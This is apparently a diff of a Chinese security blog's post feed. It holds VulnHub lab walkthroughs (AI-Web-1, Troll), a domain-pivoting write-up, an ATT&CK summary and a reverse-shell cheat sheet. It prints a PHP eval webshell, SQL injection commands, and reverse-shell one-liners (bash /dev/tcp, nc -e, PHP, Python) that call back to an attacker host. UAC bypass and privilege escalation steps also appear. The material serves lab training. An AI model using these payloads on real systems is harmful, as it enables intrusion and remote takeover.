+<p>打开任意浏览器访问靶机ip/shell地址，触发反弹，获得shell<br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230702001410248.png" alt="image-20230702001410248"></p>
+<p>提权</p>
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230702001430883.png" alt="image-20230702001430883"></p>
+<p>使用getsystem提权报错，需要绕过uac，设置session参数为上面会话id</p>
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230702001510227.png" alt="image-20230702001510227"></p>
+<p>运行后会在靶机触发一个对话框，完成之后获得权限<br><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230702001646122.png" alt="image-20230702001646122"></p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">use exploit<span class="regexp">/windows/</span>local/bypassuac</span><br></pre></td></tr></table></figure>
+<p>不会触发弹窗，但是该脚本似乎针对32位系统</p>
+<p>令牌操纵提权</p>
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230702003510695.png" alt="image-20230702003510695"></p>
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230702003532625.png" alt="image-20230702003532625"></p>
+<p>C/S方法</p>
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230702093554413.png" alt="image-20230702093554413"></p>
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230702093610628.png" alt="image-20230702093610628"></p>
+<p>设置监听器</p>
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230702093644967.png" alt="image-20230702093644967"></p>
+<p>生成攻击载荷</p>
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230702093706112.png" alt="image-20230702093706112"></p>
+<p>靶机连接</p>
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230702093732115.png" alt="image-20230702093732115"></p>
+<p>信息收集</p>
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230702094346804.png" alt="image-20230702094346804"></p>
+<p>发现内网ip</p>
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230702094429789.png" alt="image-20230702094429789"></p>
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230702094513640.png" alt="image-20230702094513640"></p>
+<p>主机密码收集</p>
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230702094633992.png" alt="image-20230702094633992"></p>
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230702094751480.png" alt="image-20230702094751480"></p>
+<p>获得账号密码</p>
+<p>使用cs的socks功能将msf带入内网</p>
+<p>在beacon中输入socks 端口号，view-proxypivots</p>
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230702095226868.png" alt="image-20230702095226868"></p>
+<p>msf配置</p>
+<p>修改/etc/proxychains4.conf</p>
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230702095819896.png" alt="image-20230702095819896"></p>
+<p><img src="/2023/06/29/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%9A%84%E6%B8%97%E9%80%8F/image-20230702095905579.png" alt="image-20230702095905579"></p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>域</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Att&amp;ck详解</title>
+    <url>/2023/06/28/Att-ck%E8%AF%A6%E8%A7%A3/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>对att&amp;ck的学习</p>
+<span id="more"></span>
+<h1 id="战术"><a href="#战术" class="headerlink" title="战术"></a>战术</h1><h2 id="侦察"><a href="#侦察" class="headerlink" title="侦察"></a>侦察</h2><p>攻击者主动或被动收集一些用于锁定攻击目标的信息，包括受害组织、基础设施或员工的详细信息。</p>
+<h2 id="资源开发"><a href="#资源开发" class="headerlink" title="资源开发"></a>资源开发</h2><p>攻击者创建、购买或窃取用于锁定攻击目标的资源，资源包括基础设施、账户或功能。例如使用购买的域名来实现命令与控制，利用邮件账户进行钓鱼以便实现初始访问，或企鹅去代码签名证书来实现防御绕过</p>
+<h2 id="初始访问"><a href="#初始访问" class="headerlink" title="初始访问"></a>初始访问</h2><p>攻击者在企业环境中建立立足点。例如，攻击者使用鱼叉式钓鱼附件进行攻击，附件会利用某种类型的漏洞来实现该级别的访问，例如powershell或其他脚本技术。</p>
+<h2 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h2><p>攻击者在考虑使用现成的恶意软件、勒索软件或APT攻击时往往会选择执行这个战术。杀毒软件并不能轻松查找到所有恶意可执行文件。命令行界面或powershell对于攻击者而言非常有用。</p>
+<h2 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h2><p>注册表运行键、启动文件夹是最常用的技术。</p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>利用纵深防御来防止感染病毒，例如终端的外围防御体系或应用白名单。对于超出ATT&amp;CK范围的权限提升，防止方式是在终端上使用加固基线，应对权限提升的另一个办法是审计日志记录。</p>
+<h2 id="防御绕过"><a href="#防御绕过" class="headerlink" title="防御绕过"></a>防御绕过</h2><p>防御绕过技术包括卸载/禁用安全让u案件或混淆/加密数据和脚本。攻击者还可以利用并滥用可信进程隐藏和伪装恶意文件。</p>
+<p>勒索软件为代表的一些恶意软件对防御绕过毫不在意，他们的唯一目标就是在是设备上执行一次，然后尽快被发现。一些技术可以骗过防病毒(AV)产品或绕过应用白名单技术。</p>
+<h2 id="凭证访问"><a href="#凭证访问" class="headerlink" title="凭证访问"></a>凭证访问</h2><p>攻击者入侵时都希望保持一定程度的隐秘性。攻击者希望窃取尽可能多的凭证，技术比如PTK、PTH、PTT等。攻击者最喜欢的是窃取明文密码。明文密码存储在明文文件、数据库甚至注册表中。</p>
+<p>最简单的防御办法就是采用复杂密码让攻击者难以破解，最后需要监控有效账户使用情况，因为很多情况下数据泄露通过有效凭证发生的。</p>
+<h2 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h2><p>攻击者用于获取有关系统和内部网络信息的技术。</p>
+<h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p>攻击者通常会先寻找一个落脚点，然后开始在各个系统中移动，寻找更高的访问权限，以期达成最终目标。</p>
+<p>适当的网络分段可以很大程度上缓解横向移动带来的风险</p>
+<h2 id="收集"><a href="#收集" class="headerlink" title="收集"></a>收集</h2><p>攻击者用于收集信息的技术，并且从中收集与贯彻攻击者目的相关的信息来源。通常收集数据后的下一步是窃取数据。</p>
+<h2 id="命令与控制"><a href="#命令与控制" class="headerlink" title="命令与控制"></a>命令与控制</h2><p>攻击者用于在受害者网络内与已入侵系统进行通信的技术组成。通常通过模仿正常的预期流量避免被发现。</p>
+<h2 id="数据窃取"><a href="#数据窃取" class="headerlink" title="数据窃取"></a>数据窃取</h2><p>攻击者用于从网络用户窃取数据的技术。攻击者获得访问权限后，会四处搜寻相关数据，然后开始着手进行数据窃取。建立网络入侵检测或防御系统有助于识别数据何时被传输。</p>
+<h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p>技术包括破坏或篡改数据。比如某些情况下业务流程看起来很好，但数据可能已经被攻击者篡改了，这些技术可能被攻击者用来完成他们的最终目标，或者为其窃取机密提供掩护。</p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>att&amp;ck</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>AI-WEB-1.0</title>
+    <url>/2023/06/27/AI-WEB-1-0/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>思路：进行主机、端口扫描后进行drib进行目录爆破——找到sql注入页面——获取os-shell——反弹shell至攻击机——提权</p>
+<span id="more"></span>
+<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><h3 id="靶机地址"><a href="#靶机地址" class="headerlink" title="靶机地址"></a>靶机地址</h3><p><a href="https://www.vulnhub.com/entry/ai-web-1,353/">AI: Web: 1 ~ VulnHub</a></p>
+<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>kali、sqlmap、answord、burp suite</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="扫描靶机地址"><a href="#扫描靶机地址" class="headerlink" title="扫描靶机地址"></a>扫描靶机地址</h3><p><img src="/2023/06/27/AI-WEB-1-0/image-20230627204534720.png" alt="image-20230627204534720"></p>
+<p>得到靶机地址192.168.153.143</p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/2023/06/27/AI-WEB-1-0/image-20230627210713381.png" alt="image-20230627210713381"></p>
+<p><img src="/2023/06/27/AI-WEB-1-0/image-20230627211608307.png" alt="image-20230627211608307"></p>
+<p>看到两个路径，访问后发现没有权限。</p>
+<h3 id="漏扫"><a href="#漏扫" class="headerlink" title="漏扫"></a>漏扫</h3><p><img src="/2023/06/27/AI-WEB-1-0/image-20230627212141024.png" alt="image-20230627212141024"></p>
+<p><img src="/2023/06/27/AI-WEB-1-0/image-20230627212329732.png" alt="image-20230627212329732"></p>
+<p>发现三个网页，一一查看<br><img src="/2023/06/27/AI-WEB-1-0/image-20230627212422474.png" alt="image-20230627212422474"><br>等下用geogle搜一下<br><img src="/2023/06/27/AI-WEB-1-0/image-20230627212516544.png" alt="image-20230627212516544"><br>这里提到的两个路径是当时被拒绝的路径<br><img src="/2023/06/27/AI-WEB-1-0/image-20230627212603322.png" alt="image-20230627212603322"><br>权限拒绝</p>
+<h3 id="爆破目录"><a href="#爆破目录" class="headerlink" title="爆破目录"></a>爆破目录</h3><p>沿着目录继续爆破<br><img src="/2023/06/27/AI-WEB-1-0/image-20230627215150636.png" alt="image-20230627215150636"></p>
+<p><img src="/2023/06/27/AI-WEB-1-0/image-20230627215124147.png" alt="image-20230627215124147"></p>
+<p>从info.php中得到以下信息<br><img src="/2023/06/27/AI-WEB-1-0/image-20230627215356887.png" alt="image-20230627215356887"></p>
+<p><img src="/2023/06/27/AI-WEB-1-0/image-20230627215500355.png" alt="image-20230627215500355"></p>
+<p>得到两个路径，第一个访问是一个搜索栏，尝试sql注入，第二个状态码301，页面被重定向等下看</p>
+<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p><img src="/2023/06/27/AI-WEB-1-0/image-20230628085709747.png" alt="image-20230628085709747"><br>输入1正常返回，输入1‘产生报错信息，考虑联合查询<br><img src="/2023/06/27/AI-WEB-1-0/image-20230628085759951.png" alt="image-20230628085759951" style="zoom:67%;"><img src="/2023/06/27/AI-WEB-1-0/image-20230628090047794.png" alt="image-20230628090047794" style="zoom:67%;"><img src="/2023/06/27/AI-WEB-1-0/image-20230628090220800.png" alt="image-20230628090220800" style="zoom:67%;"></p>
+<p>考虑为字符型注入，bp抓包分析一下可以得到注入点是uid=1&amp;Operation==Submit</p>
+<p><img src="/2023/06/27/AI-WEB-1-0/image-20230628090936165.png" alt="image-20230628090936165" style="zoom: 80%;"></p>
+<p><img src="/2023/06/27/AI-WEB-1-0/image-20230628091005743.png" alt="image-20230628091005743" style="zoom:80%;"></p>
+<p>得到字段数为3，获取数据库名和版本号<br><img src="/2023/06/27/AI-WEB-1-0/image-20230628091133478.png" alt="image-20230628091133478"></p>
+<p>获取表名的时候发现没有使用select的权限<br><img src="/2023/06/27/AI-WEB-1-0/image-20230628091613025.png" alt="image-20230628091613025"></p>
+<h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http:<span class="regexp">//i</span>p<span class="regexp">//</span>se3reTdir777/i</span><br><span class="line">ndex.php -data <span class="string">&quot;uid=1&amp;Operation=Submit&quot;</span> -dbs</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/06/27/AI-WEB-1-0/image-20230628092816797.png" alt="image-20230628092816797"></p>
+<p>可以看到有两个数据库分别是aiweb1和infornation_schema，存在四种类型sql注入漏洞。</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http:<span class="regexp">//i</span>p<span class="regexp">//</span>se3reTdir777/index.php -data <span class="string">&quot;uid=1&amp;Operation=Submit&quot;</span> -D aiweb1 --tables</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/06/27/AI-WEB-1-0/image-20230628093051581.png" alt="image-20230628093051581"></p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http:<span class="regexp">//i</span>p<span class="regexp">//</span>se3reTdir777/index.php -data <span class="string">&quot;uid=1&amp;Operation=Submit&quot;</span> -T user --columns</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/06/27/AI-WEB-1-0/image-20230628093401833.png" alt="image-20230628093401833"></p>
+<p><img src="/2023/06/27/AI-WEB-1-0/image-20230628093419589.png" alt="image-20230628093419589"></p>
+<p>然后看看是否有敏感信息可以查看，然后就执行os-shell吧。</p>
+<h3 id="os-shell"><a href="#os-shell" class="headerlink" title="os-shell"></a>os-shell</h3><p><img src="/2023/06/27/AI-WEB-1-0/image-20230628094800799.png" alt="image-20230628094800799"></p>
+<p><img src="/2023/06/27/AI-WEB-1-0/image-20230628094819292.png" alt="image-20230628094819292"></p>
+<p><img src="/2023/06/27/AI-WEB-1-0/image-20230628094850683.png" alt="image-20230628094850683"></p>
+<p>绝对路径查看info.php，得到绝对路径/home/www/html/web1x443290o2sdf92213<br><img src="/2023/06/27/AI-WEB-1-0/image-20230628095037904.png" alt="image-20230628095037904"><br>结合之前看到的se3reTdir777/uploads/来上传shell</p>
+<p>成功进入shell<br><img src="/2023/06/27/AI-WEB-1-0/image-20230628095417249.png" alt="image-20230628095417249"></p>
+<p>上传一句话木马，内容：$&lt;?php @eval($_POST[‘akali’]);?&gt;，通过sqlmap上传木马<br><img src="/2023/06/27/AI-WEB-1-0/image-20230628102648310.png" alt="image-20230628102648310"></p>
+<p>可以看到成功上传<br><img src="/2023/06/27/AI-WEB-1-0/image-20230628102712207.png" alt="image-20230628102712207"></p>
+<p>或者使用反弹shell<br><img src="/2023/06/27/AI-WEB-1-0/image-20230628102847493.png" alt="image-20230628102847493"><br>创建webshell.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sock</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="string">&quot;192.168.50.129&quot;</span>,<span class="number">8888</span>);</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>使用os-shell下载webshell<br><img src="/2023/06/27/AI-WEB-1-0/image-20230628104508215.png" alt="image-20230628104508215"></p>
+<h3 id="蚁剑连接"><a href="#蚁剑连接" class="headerlink" title="蚁剑连接"></a>蚁剑连接</h3><p><img src="/2023/06/27/AI-WEB-1-0/image-20230628104738569.png" alt="image-20230628104738569"></p>
+<p><img src="/2023/06/27/AI-WEB-1-0/image-20230628104925500.png" alt="image-20230628104925500"></p>
+<p>正向连接</p>
+<p>攻击机开启监听，靶机连接至攻击机，发现nc无-e命令，选择绕过</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">rm <span class="regexp">/tmp/</span>f;mkfifo <span class="regexp">/tmp/</span>z;cat <span class="regexp">/tmp/</span>z|<span class="regexp">/bin/</span>bash -i <span class="number">2</span>&gt;&amp;<span class="number">1</span>|nc ip port &gt; <span class="regexp">/tmp/</span>f</span><br></pre></td></tr></table></figure>
+<p>反向连接</p>
+<p>攻击机开启监听并开启http服务，上传webshell.php，靶机下载webshell.php并允许，反弹shell至攻击机</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>发现用户是低权限用户<br><img src="/2023/06/27/AI-WEB-1-0/image-20230628115338538.png" alt="image-20230628115338538"></p>
+<p>查看内核版本，版本为18.04.3<br><img src="/2023/06/27/AI-WEB-1-0/image-20230628115308244.png" alt="image-20230628115308244"></p>
+<p>创建用户，生成md5加密密码并写入passwd中<br><img src="/2023/06/27/AI-WEB-1-0/image-20230628171715033.png" alt="image-20230628171715033"><br>切换环境后切换用户<br><img src="/2023/06/27/AI-WEB-1-0/image-20230628171956800.png" alt="image-20230628171956800"></p>
+<p>获取root权限，找到目标文件<br><img src="/2023/06/27/AI-WEB-1-0/image-20230628172140914.png" alt="image-20230628172140914"></p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>靶场</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>shell</title>
+    <url>/2023/06/26/%E5%8F%8D%E5%BC%B9shell/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><img src="/2023/06/26/%E5%8F%8D%E5%BC%B9shell/image-20230627190656213.png" alt="image-20230627190656213"></p>
+<span id="more"></span>
+<h1 id="正向shell"><a href="#正向shell" class="headerlink" title="正向shell"></a>正向shell</h1><p>服务端发送shell，攻击机在内网，被攻击机在外网，外网被攻击机无法直接访问内网中的攻击机，所以需要攻击机主动给出shell，来建立连接</p>
+<ol>
+<li>服务端监听端口并反弹shell<br><img src="/2023/06/26/%E5%8F%8D%E5%BC%B9shell/image-20230627174004381.png" alt="image-20230627174004381"></li>
+<li>客户端连接端口，客户端就拿到服务端的shell控制权了<br><img src="/2023/06/26/%E5%8F%8D%E5%BC%B9shell/image-20230627201348670.png" alt="image-20230627201348670"></li>
+</ol>
+<h1 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向shell</h1><p>攻击机在外网，被攻击机在内网，攻击机无法直接连接被攻击机，需要被攻击机返回一个shell至攻击机来使攻击机获取shell</p>
+<ol>
+<li>攻击机开启监视钓鱼，可以通过构造恶意url、csrf、社工等方法使被攻击机点击连接或运行文件执行恶意代码<br><img src="/2023/06/26/%E5%8F%8D%E5%BC%B9shell/image-20230627201745639.png" alt="image-20230627201745639"></li>
+<li>被攻击机执行恶意代码，返回给攻击端一个shell<br><img src="/2023/06/26/%E5%8F%8D%E5%BC%B9shell/image-20230627201848438.png" alt="image-20230627201848438"></li>
+<li>攻击机获得靶机控制权<br><img src="/2023/06/26/%E5%8F%8D%E5%BC%B9shell/image-20230627201931483.png" alt="image-20230627201931483"></li>
+</ol>
+<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><h2 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp<span class="regexp">/ip/</span>port <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment"># linux</span></span><br><span class="line">nc -e <span class="regexp">/bin/</span>sh ip port</span><br><span class="line"><span class="comment"># windows</span></span><br><span class="line">n</span><br></pre></td></tr></table></figure>
+<h2 id="pty"><a href="#pty" class="headerlink" title="pty"></a>pty</h2><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>
+<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><figure class="highlight tcl"><table><tr><td class="code"><pre><span class="line">php -r &#x27;<span class="variable">$f</span>=fsockopen(<span class="string">&quot;ip&quot;</span>,port);<span class="keyword">exec</span>(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>
+<h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><figure class="highlight pf"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,<span class="keyword">os</span>; \</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span><br><span class="line">s.connect((<span class="string">&quot;ip&quot;</span>,<span class="keyword">port</span>));</span><br><span class="line"><span class="keyword">os</span>.dup2(s.fileno(),<span class="number">0</span>);</span><br><span class="line"><span class="keyword">os</span>.dup2(s.fileno(),<span class="number">1</span>);</span><br><span class="line"><span class="keyword">os</span>.dup2(s.fileno(),<span class="number">2</span>);</span><br><span class="line">p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);&#x27;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>shell</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>FTP</title>
+    <url>/2023/06/26/FTP/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="使用工具"><a href="#使用工具" class="headerlink" title="使用工具"></a>使用工具</h2><p>3CDaemon</p>
+<h2 id="FTP匿名登陆"><a href="#FTP匿名登陆" class="headerlink" title="FTP匿名登陆"></a>FTP匿名登陆</h2><div class="table-container">
+<table>
+<thead>
+<tr>
+<th>用户名</th>
+<th>密码</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>anonymous</td>
+<td>Email，空</td>
+</tr>
+<tr>
+<td>FTP</td>
+<td>FTP，空</td>
+</tr>
+<tr>
+<td>USER</td>
+<td>pass</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>使用方式为：ftp url或ip，连接成功会提示用户输入账号密码</p>
+<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>ascii：切换输出模式为文字模式<br>binary：切换传输模式为二进制模式<br>type：更改或显示目前传输模式</p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>协议</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Troll</title>
+    <url>/2023/06/26/Troll/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>思路：主机扫描发现开放端口服务——匿名登陆FTP，下载lol.pacp——wireshark分析找到文件路径——hydra爆破得到ssh用户名密码——提权：内核版本漏洞提权(定时任务提权)</p>
+<h3 id="nmap或netdiscover进行主机发现"><a href="#nmap或netdiscover进行主机发现" class="headerlink" title="nmap或netdiscover进行主机发现"></a>nmap或netdiscover进行主机发现</h3><p><img src="/2023/06/26/Troll/image-20230626192813401.png" alt="image-20230626192813401"></p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/2023/06/26/Troll/image-20230626193035047.png" alt="image-20230626193035047"></p>
+<p>看到了三个开启的tcp端口</p>
+<h3 id="UDP扫描"><a href="#UDP扫描" class="headerlink" title="UDP扫描"></a>UDP扫描</h3><p><img src="/2023/06/26/Troll/image-20230626193328142.png" alt="image-20230626193328142"></p>
+<h3 id="服务扫描"><a href="#服务扫描" class="headerlink" title="服务扫描"></a>服务扫描</h3><p><img src="/2023/06/26/Troll/image-20230626193547292.png" alt="image-20230626193547292"></p>
+<p>得到了中间件或者协议的版本信息以及操作系统类型和版本</p>
+<h3 id="nikto和dirb扫描"><a href="#nikto和dirb扫描" class="headerlink" title="nikto和dirb扫描"></a>nikto和dirb扫描</h3><p><img src="/2023/06/26/Troll/image-20230626202400256.png" alt="image-20230626202400256"></p>
+<p>看到里面提到robots.txt以及apache版本较老的信息，总之没有很多有用信息</p>
+<p><img src="/2023/06/26/Troll/image-20230626202959230.png" alt="image-20230626202959230"></p>
+<h3 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h3><p>发现有四个文件其中就有secret在上面nikto出现过的，一一查看</p>
+<p><img src="/2023/06/26/Troll/image-20230626203120299.png" alt="image-20230626203120299" style="zoom:50%;"><img src="/2023/06/26/Troll/image-20230626203140833.png" alt="image-20230626203140833"><br><img src="/2023/06/26/Troll/image-20230626203233627.png" alt="image-20230626203233627"><br><img src="/2023/06/26/Troll/image-20230626203311441.png" alt="image-20230626203311441" style="zoom: 33%;"><br><img src="/2023/06/26/Troll/image-20230626203348437.png" alt="image-20230626203348437"><br>没有权限</p>
+<h3 id="尝试ftp"><a href="#尝试ftp" class="headerlink" title="尝试ftp"></a>尝试ftp</h3><p><img src="/2023/06/26/Troll/image-20230626195427841.png" alt="image-20230626195427841"></p>
+<p>注意到ftp允许匿名登录，还有一个文件lol.pacp，是包文件，查看lol.pacp</p>
+<p><img src="/2023/06/26/Troll/image-20230626203715440.png" alt="image-20230626203715440"></p>
+<h3 id="wireshark分析包"><a href="#wireshark分析包" class="headerlink" title="wireshark分析包"></a>wireshark分析包</h3><p>使用wireshark打开包<br><img src="/2023/06/26/Troll/image-20230626204647080.png" alt="image-20230626204647080"><br>如图是登录时候的包<br><img src="/2023/06/26/Troll/image-20230626204914996.png" alt="image-20230626204914996"><br>SYST获取服务器操作系统，返回结果215 UNIX L8<br><img src="/2023/06/26/Troll/image-20230626205320375.png" alt="image-20230626205320375"><br>LIST列出所有文件<br><img src="/2023/06/26/Troll/image-20230626205702559.png" alt="image-20230626205702559"></p>
+<p><img src="/2023/06/26/Troll/image-20230626210632560.png" alt="image-20230626210632560"><img src="/2023/06/26/Troll/image-20230626210724641.png" alt="image-20230626210724641"><br>提到一个文件secret_stuff.txt,命令是RETR secret_styff.txt，返回sup3rs3cr3tdirlol</p>
+<h3 id="获得密码本和账号本"><a href="#获得密码本和账号本" class="headerlink" title="获得密码本和账号本"></a>获得密码本和账号本</h3><p>尝试访问该网址</p>
+<p><img src="/2023/06/26/Troll/image-20230626210841619.png" alt="image-20230626210841619"></p>
+<p>下载下来发现是一个可执行文件<br><img src="/2023/06/26/Troll/image-20230626211243631.png" alt="image-20230626211243631"></p>
+<p>发现新路径<br><img src="/2023/06/26/Troll/image-20230626211305138.png" alt="image-20230626211305138"></p>
+<p><img src="/2023/06/26/Troll/image-20230626211401959.png" alt="image-20230626211401959"></p>
+<p><img src="/2023/06/26/Troll/image-20230626211419598.png" alt="image-20230626211419598"></p>
+<p><img src="/2023/06/26/Troll/image-20230626211435189.png" alt="image-20230626211435189"></p>
+<h3 id="使用hydra进行爆破"><a href="#使用hydra进行爆破" class="headerlink" title="使用hydra进行爆破"></a>使用hydra进行爆破</h3><p><img src="/2023/06/26/Troll/image-20230626212830576.png" alt="image-20230626212830576"></p>
+<p><img src="/2023/06/26/Troll/image-20230626212911064.png" alt="image-20230626212911064"></p>
+<p>结果Pass.txt是密码</p>
+<p>使用ssh连接靶机<br><img src="/2023/06/26/Troll/image-20230626213101991.png" alt="image-20230626213101991"></p>
+<p>反弹shell获得可交互终端<br><img src="/2023/06/26/Troll/image-20230626214407208.png" alt="image-20230626214407208"></p>
+<h3 id="内核版本漏洞提权"><a href="#内核版本漏洞提权" class="headerlink" title="内核版本漏洞提权"></a>内核版本漏洞提权</h3><p>查看内核版本和系统版本<br><img src="/2023/06/26/Troll/image-20230626215333063.png" alt="image-20230626215333063"></p>
+<p>寻找合适exp</p>
+<p><img src="/2023/06/26/Troll/image-20230626220606669.png" alt="image-20230626220606669"></p>
+<p><img src="/2023/06/26/Troll/image-20230626220632829.png" alt="image-20230626220632829"></p>
